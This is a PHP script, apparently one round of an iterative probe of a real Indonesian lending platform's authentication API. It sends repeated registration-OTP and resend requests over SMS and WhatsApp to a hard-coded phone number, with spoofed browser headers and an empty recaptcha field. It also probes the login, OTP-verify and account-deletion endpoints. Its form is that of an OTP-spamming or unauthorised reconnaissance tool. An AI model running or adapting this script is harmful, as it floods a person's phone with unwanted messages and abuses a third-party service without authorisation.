<?php
// Ronde 13: Danacita atlas OTP di host api.danacita.co.id (dapat 405 = path hidup)
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$L = '083822461998'; $N = '83822461998'; $P = '6283822461998';

function post($url, $body, $extra = []) {
  $ch = curl_init();
  $h = array_merge(['Accept: application/json, text/plain, */*', 'Content-Type: application/json',
    'Origin: https://app.danacita.co.id', 'Referer: https://app.danacita.co.id/'], $extra,
    ['User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36']);
  curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_HTTPHEADER => $h, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 30, CURLOPT_ENCODING => '', CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $body]);
  $r = (string) curl_exec($ch); $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  $err = curl_error($ch); curl_close($ch);
  $f = trim(preg_replace('/\s+/', ' ', $r));
  if (preg_match('/<title>(.*?)<\/title>/is', $f, $m)) $f = 'html title=' . trim($m[1]);
  return sprintf("[%s] %s", $code ?: '000', $err !== '' ? 'GAGAL: ' . $err : ($f !== '' ? substr($f, 0, 210) : '(kosong)'));
}

$A = 'https://api.danacita.co.id/api/atlas/v1/auth/';
$T = [
  ['otp-L',      $A . 'registration-otp-request', '{"username":"' . $L . '"}'],
  ['otp-P',      $A . 'registration-otp-request', '{"username":"' . $P . '"}'],
  ['otp-full',   $A . 'registration-otp-request', '{"username":"' . $L . '","recaptcha":"","notif_channel_mode":"sms","is_white_label":false}'],
  ['otp-wa',     $A . 'registration-otp-request', '{"username":"' . $L . '","recaptcha":"","notif_channel_mode":"wa","is_white_label":false}'],
  ['resend',     $A . 'registration-otp-resend',  '{"username":"' . $L . '"}'],
  ['probe-login', $A . 'login/',                 '{}'],
  ['probe-otpval', $A . 'registration-otp-verify', '{}'],
  ['acct-del',   'https://api.danacita.co.id/api/atlas/v1/account-deletion/', '{}'],
];
foreach ($T as [$n, $u, $b]) { printf("%-13s %s\n", $n, post($u, $b)); usleep(300000); }
echo "\n";
